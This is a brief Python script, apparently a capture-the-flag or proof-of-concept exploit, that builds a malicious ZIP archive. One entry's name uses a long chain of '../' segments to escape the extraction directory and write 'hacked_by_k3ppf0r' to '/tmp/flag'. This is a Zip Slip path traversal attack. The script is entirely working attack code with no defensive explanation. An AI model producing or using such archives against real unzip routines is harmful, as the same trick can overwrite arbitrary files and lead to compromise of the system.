import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'k'
        binary2 = b'hacked_by_k3ppf0r'
        zipFile = zipfile.ZipFile("hack.zip", "w", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("hack.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr(
            "../../../../../../../../../../../../../../../../../../../tmp/flag", binary2
        )
        zipFile.close()
    except IOError as e:
        raise e
